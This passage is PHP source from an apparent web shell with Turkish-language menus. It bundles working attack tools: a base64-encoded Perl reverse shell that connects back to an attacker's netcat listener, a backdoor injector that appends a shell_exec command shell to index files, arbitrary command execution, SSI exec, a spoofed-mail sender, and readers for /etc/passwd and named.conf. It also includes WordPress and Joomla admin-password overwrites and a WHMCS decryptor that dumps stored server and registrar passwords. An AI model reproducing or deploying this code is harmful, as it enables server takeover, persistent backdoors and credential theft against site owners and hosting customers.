                if ('cpanel' == $option) {
                    cpanel_check($target, $_user, $_pass, $connect_timeout);
                }
            }
        }
    }
}
if ('bc' == $_GET[id]) {
    $bc_perl = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==';
    echo '
	<p align="center"><font size="5"><b> Back Connecting </b></font></p>
	<p align="center"><font color="black">Netcat a� bu komutu uygula:</font><i><font color="#FF0000"> nc -l -p 1542</font></i>
	</p><br>
	<div align="center"><form method="POST" action="">
	<input type="text" name="pip" value="',$_SERVER['REMOTE_ADDR'],'" class="input" /> :
	<input type="text" name="pport" size="5" value="1542" class="input" /> <br><br>
	<input type="text" name="ppath" value="/tmp" class="input" /><br><br>
	<input type="submit" value=" Connect " class="button" />
	</form></div>';
    $pip = $_POST['pip'];
    $pport = $_POST['pport'];
    if ('' != $pip) {
        $fp = fopen($_POST['ppath'] . DS . rand(0, 10) . 'bc_perl_enhack.pl', 'w');
        if (!$fp) {
            $Sonu� = 'Error: couldn\'t write file to open socket connection';
        } else {
            @fputs($fp, @base64_decode($bc_perl));
            fclose($fp);
            $Sonu� = ex('perl ' . $_POST['ppath'] . '/bc_perl_enhack.pl ' . $pip . ' ' . $pport . ' &');
        }
    }
}
if ('feykmail' == $_GET[id]) {
    echo "        <form enctype='multipart/form-data' method='POST'>
        <table>
        
        <tr><td>Yollayan Adres</td></tr>
        <tr>
        <td align='left'>
            <input type='text' name='from' />
        </td>
        </tr>
        
        <tr><td>Gidecek Adres</td></tr>
        <tr>
        <td align='left'>
            <input type='text' name='to'/>
        </td>
        </tr>
        
        <tr><td>Konu Baslik</td></tr>
        <tr>
        <td align='left'>
            <input type='text' name='subject' />
        </td>
        </tr>
        
        <tr><td>Dosya ekle</td></tr>
        <tr>
        <td align='left'>
            <input name='uploaded' type='file'/>
        </td>
        </tr>
        
        <tr><td>Mesaj</td></tr>
        <tr>
        <td align='left'>
            <TEXTAREA rows='15' cols='36' name='text'/></TEXTAREA>
        </td>
        </tr>
        
        <tr>
        <td aling='right'>
            <input type='submit' value='G�nder' name='sendamail'/>
        </td>";
    if (isset($_POST['sendamail']) &&
isset($_POST['from']) &&
isset($_POST['to']) &&
isset($_POST['subject']) &&
isset($_POST['text'])) {
        $err = 'Errore invio !';
        $ok = 1;
        $from = $_POST['from'];
        $to = $_POST['to'];
        $subject = $_POST['subject'];
        $message = $_POST['text'];
        $headers = "From: $from";
        if (isset($_FILES['uploaded']) && $uploaded_size) {
            $target = './uploads/';
            $target = $target . basename($_FILES['uploaded']['name']) . '.dat';
            if ($uploaded_size > 350000) {
                $err = 'Allegato troppo grande (max 350 KB) !';
                $ok = 0;
            }
            if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) {
                $err = "Impossibile uploadare l'allegato !";
                $ok = 0;
            } else {
                $fileatt = $target;
                $fileatt_type = 'application/octet-stream';
                $fileatt_name = basename($_FILES['uploaded']['name']);
                $file = fopen($fileatt, 'rb');
                $data = fread($file, filesize($fileatt));
                fclose($file);
                $semi_rand = md5(time());
                $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
                $headers .= "\nMIME-Version: 1.0\n" .
"Content-Type: multipart/mixed;\n" .
" boundary=\"{$mime_boundary}\"";
                $message .= "This is a multi-part message in MIME format.\n\n" .
"--{$mime_boundary}\n" .
"Content-Type:text/html; charset=\"iso-8859-1\"\n" .
"Content-Transfer-Encoding: 7bit\n\n" .
$message . "\n\n";
                $data = chunk_split(base64_encode($data));
                $message .= "--{$mime_boundary}\n" .
"Content-Type: {$fileatt_type};\n" .
" name=\"{$fileatt_name}\"\n" .
"Content-Transfer-Encoding: base64\n\n" .
$data . "\n\n" .
"--{$mime_boundary}--\n";
            }
        }
        if (!$ok) {
            echo "<font color='#FF0000'><b>$err</b></font>";
            @unlink($target);
        } else {
            if (@mail($to, $subject, $message, $headers)) {
                echo '<b>Email Yollandi</b>';
            } else {
                echo "<font color='#FF0000'><b>$err</b></font>";
            }
            @unlink($target);
        }
    }
}
if ('command2' == $_GET[id]) {
    echo "  <tr>
    <td width='100%' height='1'>";
    if (empty($_POST['z3r'])) {
        echo '<form method="POST">';
        echo '<input type="text" name="z3r" size="50" value="/home/hedefuser/public_html/index.php">';
        echo '<input type="submit" value="Encode">';
        echo '</form>';
    } else {
        $b4se64 = $_POST['z3r'];
        $heno = base64_encode($b4se64);
        echo '<p align="center">';
        echo '<textarea method="POST" rows="1" cols="80" wrar="off">';
        echo $heno;
        echo '</textarea>';
    }
    echo '<form method="post" /><input type="text" name="cz" size="50" value="L2V0Yy9wYXNzd2Q=" /><input type="submit" value="OK !!" /><select name=dec><option value=show>Oku</option><option value=decode>Komut</option></select></form>';
    if (!empty($_POST['cz'])) {
        if ('decode' == $dec) {
            echo '<form name=form method=POST>';
        }
    }
    echo "<p align=left><textarea method='POST' name='xCod' cols='60' rows='25' wrar='off' >";
    $ss = $_POST['cz'];
    $file = base64_decode($ss);
    if ((curl_exec(curl_init('file:ftp://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../' . $file))) and empty($file)) {
        if ('decode' == $_POST['dec']) {
            echo base64_encode($_POST['xCod']);
        }
    }
    echo '</textarea></p>';
    echo '</td>
</tr>';
}
if ('reverse' == $_GET[a]) {
    $site = "$_GET[site]";
    $kaynak = file_get_contents("http://whatisonip.com/domain-info/$site");
    preg_match_all('#<a href="/redir/?(.*?)">#si', $kaynak, $kursat);
    foreach ($kursat[1] as $cem) {
        echo str_replace('?', '', $cem) . '<br>';
    }
}
if ('reversem' == $_GET[id]) {
    echo '<br><b>http://www.</b> Koymadan yaz�n <b>site.com</b> gibi ';
    echo '<br><form action="" method="post">
 <input type="text" name="site" />
 <input type="submit" value="g�nder" />
</form> ';
    $site = "$_POST[site]";
    $kaynak = file_get_contents("http://whatisonip.com/domain-info/$site");
    preg_match_all('#<a href="/redir/?(.*?)">#si', $kaynak, $kursat);
    foreach ($kursat[1] as $cem) {
        echo str_replace('?', '', $cem) . '<br>';
    }
}
if ('md5' == $_GET[id]) {
    echo '<form method="POST">
<p><input type="md5_text" name="md5_text" id="md5_text">
<input type="submit" name="md5_send" value="make hash">
</form>';
    if (isset($_POST['md5_send'])) {
        if (empty($_POST['md5_text'])) {
            die('you don\'t type word for make hash');
        }
        $word = $_POST['md5_text'];
        $word2 = md5("$word");
        echo "<font color='#ff0000'>$word</font> hash = <b>$word2</b>";
    }
}
if ('Cmdinject' == $_GET[id]) {
    echo " <br>     <tr>
        <td class='td' style='border-bottom-width:thin'><form name='form3' method='post' action=''>
          Backdoorlanacak dosya : 
              <INPUT NAME='IndexName' TYPE='TEXT' class='txt' size='23'>
              <input name='Submit4' type='submit' value='Inject Cmd Sheller'>
              <br><span class='txt' >�rnek : index.php</span>        
        </form></td >
      </tr>";
    if (isset($_POST['Submit4'])) {
        $IName = (@$_POST['IndexName']);
        if ('' == $IName) {
            echo '<font color=red>[+] Plz Insert Index Name, For Previous Directory Use ( ../ ) Symbol .</font><Br>';
        } else {
            $CMD = '<?php $cmdd=(@$_REQUEST["cmd"]); echo(shell_exec($cmdd)); ?>';
            $FFP = @fopen($IName, 'a');
            $fWrite = @fwrite($FFP, $CMD);
            if ($fWrite) {
                echo '<font color=green>[+] CMD Sheller Successful Inj3cted .</font><BR>';
            } else {
                echo '<font color=red>[+] No Perm !</font><BR>';
            }
        }
    }
}
if ('uzakupload' == $_GET[id]) {
    echo '</pre></form>';
    if (isset($_POST['upload'])) {
        $savefile = getcwd() . '/' . $_FILES['file']['name']['0'];
        move_uploaded_file($_FILES['file']['tmp_name']['0'], $savefile);
        $filesizename = [' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB'];
        $size = round($_FILES['file']['size']['0'] / pow(1024, ($i = floor(log($_FILES['file']['size']['0'], 1024)))), 2) . $filesizename[$i];
        echo '<b>Uploaded be completed !</b><br>Details:<br>Filename: <b>' . $_FILES['file']['name']['0'] . '</b>.<br>Size: <b>' . $size . '</b>.';
    }
    echo '<br><u><b>Upload Files:</b></u><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="add"><input type="file" name="file[]" size="50"><br><input type="submit" value="Upload File !" name="upload"></form><hr><br>';
    if (isset($_POST['upload_url'])) {
        $file = $_POST['upload_url_text'];
        $newfile = $_POST['rename'];
        if (!copy($file, $newfile)) {
            echo "failed to copy $file...\\n";
        }
    }
    echo '<u><b>Upload Files From URL:</b></u><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="add"><input type="text" name="upload_url_text" size="50"><br>Rename to: <input type="text" name="rename" size="10" value="inj.php"><br><input type="submit" value="Upload File !" name="upload_url"></form>';
}
if ('CloudBypass' == $_GET[id]) {
    echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass
<font color="#CC0000">CloudFlare</font> ]=--+</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';
    $target = $_POST['target'];
    if ('ftp' == $_POST['krz']) {
        $ftp = gethostbyname('ftp.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
    }
    if ('direct-conntect' == $_POST['krz']) {
        $direct = gethostbyname('direct-connect.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
    }
    if ('webmail' == $_POST['krz']) {
        $web = gethostbyname('webmail.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
    }
    if ('cpanel' == $_POST['krz']) {
        $cpanel = gethostbyname('cpanel.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
    }
}
if ('read' == $_GET[id]) {
    echo 'read /etc/named.conf';
    echo "<br /><br /><form method='post' action='?id=read&save=1'><textarea cols='80' rows='20' name='file'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo '' . htmlentities($content) . '';
    } elseif (!$r3ad) {
        $r3ad = @show_source($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo '' . htmlentities($content) . '';
        }
    }
    echo "</textarea><br /><br /><input  type='submit' value='Save'/> </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<br />Kayit tamam';
        }
        fclose($f);
    }
    function ex($text, $a, $b)
    {
        $explode = explode($a, $text);
        $explode = explode($b, $explode[1]);

        return $explode[0];
    }
}
if ('sifrele' == $_GET[id]) {
    $text = $_POST['code'];
    echo "
<form method='post'><br><br><br>
<textarea class='inputz' cols=80 rows=10 name='code'></textarea><br><br>
<select class='inputz' size='1' name='ope'>
<option value='base64'>Base64</option>
<option value='gzinflate'>str_rot13 - gzinflate - base64</option>
<option value='str'>str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>";
    $submit = $_POST['submit'];
    if (isset($submit)) {
        $op = $_POST['ope'];
        switch ($op) {case 'base64': $codi = base64_encode($text);
        break;
        case 'str': $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
        break;
        case 'gzinflate': $codi = base64_encode(gzdeflate(str_rot13($text)));
        break;
        default:break;
    }
    }
    $submit = $_POST['submits'];
    if (isset($submit)) {
        $op = $_POST['ope'];
        switch ($op) {case 'base64': $codi = base64_decode($text);
        break;
        case 'str': $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
        break;
        case 'gzinflate': $codi = str_rot13(gzinflate(base64_decode($text)));
        break;
        default:break;
    }
    }
    echo '<textarea cols=80 rows=10 class="inputz" readonly>' . $codi . '</textarea></center><BR><BR>';
}
if ('hash' == $_GET[id]) {
    $submit = $_POST['enter'];
    if (isset($submit)) {
        $pass = $_POST['password'];
        $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN';
        $hash = md5($pass);
        $md4 = hash('md4', $pass);
        $hash_md5 = md5($salt . $pass);
        $hash_md5_double = md5(sha1($salt . $pass));
        $hash1 = sha1($pass);
        $sha256 = hash('sha256', $text);
        $hash1_sha1 = sha1($salt . $pass);
        $hash1_sha1_double = sha1(md5($salt . $pass));
    }
    echo '<form action="" method="post"><b><table class=tabnet>';
    echo '<tr><th colspan="2">Password Hash</th></center></tr>';
    echo '<tr><td><b>masukan kata yang ingin di encrypt:</b></td>';
    echo '<td><input class="inputz" type="text" name="password" size="40" />';
    echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
    echo '</td></tr><br>';
    echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
    echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value=' . $pass . '></td></tr><br><br>';
    echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value=' . $hash . '></td></tr><br><br>';
    echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value=' . $md4 . '></td></tr><br><br>';
    echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash_md5 . '></td></tr><br><br>';
    echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value=' . $hash_md5_double . '></td></tr><br><br>';
    echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value=' . $hash1 . '></td></tr><br><br>';
    echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value=' . $sha256 . '></td></tr><br><br>';
    echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1 . '></td></tr><br><br>';
    echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '></td></tr><br><br></table>';
}
if ('wpres' == $_GET[id]) {
    echo '<form action="?id=wpres" method="post">';
    if (empty($_POST['pwd'])) {
        echo "<FORM method='POST'>
<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Hostname</td><td>
<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' />&nbsp;

<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
    } else {
        $localhost = $_POST['localhost'];
        $database = $_POST['database'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pwd = $_POST['pwd'];
        $admin = $_POST['admin'];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $hash = crypt($pwd);
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 1") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 1") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 2") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 2") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 3") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 3") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_email ='" . $SQL . "' WHERE ID = 1") or die(mysql_error());
        if ($a4s) {
            echo '<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ';
        }
    }
    echo '
   </div>';
}
if ('joomlares' == $_GET[id]) {
    echo '<form action="?id=joomlares" method="post">';
    if (empty($_POST['pwd'])) {
        echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;pass baru </td><td>123456 = 
<input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' />&nbsp;

<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
    } else {
        $localhost = $_POST['localhost'];
        $database = $_POST['database'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pwd = $_POST['pwd'];
        $admin = $_POST['admin'];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $hash = crypt($pwd);
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 62") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 62") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 63") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 63") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 64") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 64") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 65") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 65") or die(mysql_error());
        if ($SQL) {
            echo '<b>Success : skarang password barunya >>> - (123456)';
        }
    }
    echo '
   </div>';
}
if ('komut' == $_GET[id]) {
    function cmd()
    {
        $cmd = $_POST['cmd'];
        $cmdgo = $_POST['cmdgo'];
        $option = $_POST['option'];
        $id = $_GET['id'];
        if ($cmdgo && !empty($cmd)) {
            switch ($option) {
case system:
system($cmd);
break;
case passthru:
passthru($cmd);
break;
case shell_exec:
$out = shell_exec($cmd);
echo $out;
break;
default:
system($cmd);
}
        }
    }
    echo "<form method=post action=''><font face='Courier New'>
</font></pre><br><input size=32 style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; background-color:#000000' type=text name=cmd style='background: black;color: white;border: 0px'><select name=option style='background: black;color: white'><option>system</option><option>passthru</option>
<option>shell_exec</option></select><input style='background: black;color: white;border: 1px dashed white 'type=submit name=cmdgo value=execute>
<textarea cols='125' rows='29' style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; font-size:8pt; background-color:#000000'>";
    cmd();
    echo '</textarea>
</td></table></form>';
}
if ('lite1' == $_GET[id]) {
    echo "<form name='z1d-litespeed'  method='post'>
<p align='center'><font face='Tahoma'><b><font color='#FF0000'>#</font> </b>Litespeed �ans�n� dene<b>
<span lang='ar-sa'><font color='#FF0000'>~</font> </span>&nbsp;</b><input name='command' value='id' style='border: 0px dotted #FF0000; font-family:ta' size='36' tabindex='20'><b>
</b>&nbsp; </font></p>
<p align='center'><font face='Tahoma'>
<input type='submit' name='Submit' value='�al��t�r'><b>
</b></font></p>
</form>";
    $command = $_POST['command'];
    $z00z = $_POST['z00z'];
    if ($command) {
        $z11d = "<center><pre><pre>
<br>
http://www.imhatimi.org
<br>
<br>
<!--#exec cmd='$command' --> 

";
        $openfile = fopen('mec.shtml', 'w');
        $writeinto = fwrite($openfile, "$z11d");
        fclose($openfile);
        if ($openfile) {
        } else {
        }
    }
    echo "<pre> 
 <iframe src='mec.shtml'  width=100% height=85% id='I1' name='IF1' >
</pre>";
}
if ('whmcs' == $_GET[id]) {
    function decrypt($string, $cc_encryption_hash)
    {
        $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
        $hash_key = _hash($key);
        $hash_length = strlen($hash_key);
        $string = base64_decode($string);
        $tmp_iv = substr($string, 0, $hash_length);
        $string = substr($string, $hash_length, strlen($string) - $hash_length);
        $iv = $out = '';
        $c = 0;
        while ($c < $hash_length) {
            $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
            ++$c;
        }
        $key = $iv;
        $c = 0;
        while ($c < strlen($string)) {
            if ((0 != $c and 0 == $c % $hash_length)) {
                $key = _hash($key . substr($out, $c - $hash_length, $hash_length));
            }
            $out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
            ++$c;
        }

        return $out;
    }
    function _hash($string)
    {
        if (function_exists('sha1')) {
            $hash = sha1($string);
        } else {
            $hash = md5($string);
        }
        $out = '';
        $c = 0;
        while ($c < strlen($hash)) {
            $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
            $c += 2;
        }

        return $out;
    }
    if (1 == $_POST['form_action']) {
        $file = ($_POST['file']);
        $text = file_get_contents($file);
        $text = str_replace('<?php', '', $text);
        $text = str_replace('<?', '', $text);
        $text = str_replace('?>', '', $text);
        eval($text);
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblservers');
        while ($v = mysql_fetch_array($query)) {
            $ipaddress = $v['ipaddress'];
            $username = $v['username'];
            $type = $v['type'];
            $active = $v['active'];
            $hostname = $v['hostname'];
            echo "<center><table border='1'>";
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>Type</td><td>$type</td></tr>";
            echo "<tr><td>Active</td><td>$active</td></tr>";
            echo "<tr><td>Hostname</td><td>$hostname</td></tr>";
            echo "<tr><td>Ip</td><td>$ipaddress</td></tr>";
            echo "<tr><td>Username</td><td>$username</td></tr>";
            echo "<tr><td>Password</td><td>$password</td></tr>";
            echo '</table><br><br></center>';
        }
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblregistrars');
        echo "<center>Domain Reseller <br><table border='1'>";
        echo '<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>';
        while ($v = mysql_fetch_array($query)) {
            $registrar = $v['registrar'];
            $setting = $v['setting'];
            $value = decrypt($v['value'], $cc_encryption_hash);
            if ('' == $value) {
                $value = 0;
            }
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>";
        }
        echo '</table><br><br></center>';
    }
    if (2 == $_POST['form_action']) {
        $db_host = ($_POST['db_host']);
        $db_username = ($_POST['db_username']);
        $db_password = ($_POST['db_password']);
        $db_name = ($_POST['db_name']);
        $cc_encryption_hash = ($_POST['cc_encryption_hash']);
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblservers');
        while ($v = mysql_fetch_array($query)) {
            $ipaddress = $v['ipaddress'];
            $username = $v['username'];
            $type = $v['type'];
            $active = $v['active'];
            $hostname = $v['hostname'];
            echo "<center><table border='1'>";
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>Type</td><td>$type</td></tr>";
            echo "<tr><td>Active</td><td>$active</td></tr>";
            echo "<tr><td>Hostname</td><td>$hostname</td></tr>";
            echo "<tr><td>Ip</td><td>$ipaddress</td></tr>";
            echo "<tr><td>Username</td><td>$username</td></tr>";
            echo "<tr><td>Password</td><td>$password</td></tr>";
            echo '</table><br><br></center>';
        }
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblregistrars');
        echo "<center>Domain Reseller <br><table border='1'>";
        echo '<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>';
        while ($v = mysql_fetch_array($query)) {
            $registrar = $v['registrar'];
            $setting = $v['setting'];
            $value = decrypt($v['value'], $cc_encryption_hash);
            if ('' == $value) {
                $value = 0;
            }
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>";
        }
        echo '</table><br><br></center>';
    }
    echo ' 

<center> 
<font color="#FFFF6FF" size=\'+1\'>WHMCS R00t �ifreleri g�r�nt�le</font><br><br> 

</center>  

<br> 
<center> 
<font color="#0066FF" size=\'+1\'>Whmcs confirgation.php bilgilerini yaz</font><br> 
</center> 
<FORM action=""  method="post"> 
<input type="hidden" name="form_action" value="2"> 
<br> 
<table border=1 align=center> 

<tr><td>db_host </td><td><input type="text" size="30" name="db_host" value="localhost"></td></tr> 
<tr><td>db_username </td><td><input type="text" size="30" name="db_username" value=""></td></tr> 
<tr><td>db_password</td><td><input type="text" size="30" name="db_password" value=""></td></tr> 
<tr><td>db_name</td><td><input type="text" size="30" name="db_name" value=""></td></tr> 
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr> 

</table> 
<br> 
<center>
<INPUT class=submit type="submit" value="Submit" name="Submit"> </center>
</FORM> 
<hr> 
<center> 
<font color="#0066FF" size=\'+2\'>Password decoder</font><br> 
';
    if (3 == $_POST['form_action']) {
        $password = ($_POST['password']);
        $cc_encryption_hash = ($_POST['cc_encryption_hash']);
        $password = decrypt($password, $cc_encryption_hash);
        echo 'Password is ' . $password;
    }
    echo '<FORM action=""  method="post"> 
<input type="hidden" name="form_action" value="3"> 
<br> 
<table border=1 align=center> 

<tr><td>Password</td><td><input type="text" size="30" name="password" value=""></td></tr> 
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr> 

</table> 
<br> 
<INPUT class=submit type="submit" value="Submit" name="Submit"> 
</FORM>';
}
if ('shellbul' == $_GET[id]) {
    echo '<h3 style="text-align:center"><div align=center>
<table><tr><td>
<table width=100%><tr><td align=center><font color=white size=3 face="Verdana">Hedef siteniz</font></td><td align=center><font color=white size=3 face="Verdana">Shell tahminleri alal�m :)</font></td></tr></table>
<form method="post">
<textarea rows=10 cols=50 name=link></textarea>
<textarea rows=10 cols=50 name=sh></textarea><br>
<input type="submit"  name="sm" value="Bulmaya basla" >
</form>';
    @set_time_limit(0);
    @error_reporting(0);
    function file_exists_remote($url)
    {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_NOBODY, true);
        $Sonu� = curl_exec($curl);
        $ret = false;
        if (false !== $Sonu�) {
            $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            if (200 == $statusCode) {
                $ret = true;
            }
        }
        curl_close($curl);

        return $ret;
    }
    echo '';
    $webl = $_POST['link'];
    $shelll = $_POST['sh'];
    if (isset($_POST['sm'])) {
        $webs = explode("\n", $webl);
        $shells = explode("\n", $shelll);
        foreach ($webs as $web) {
            $sweb = trim($web);
            $te1 = ereg_replace('(https?)://', '', $sweb);
            $te = ereg_replace('www.', '', $te1);
            $finalweb = 'http://' . $te;
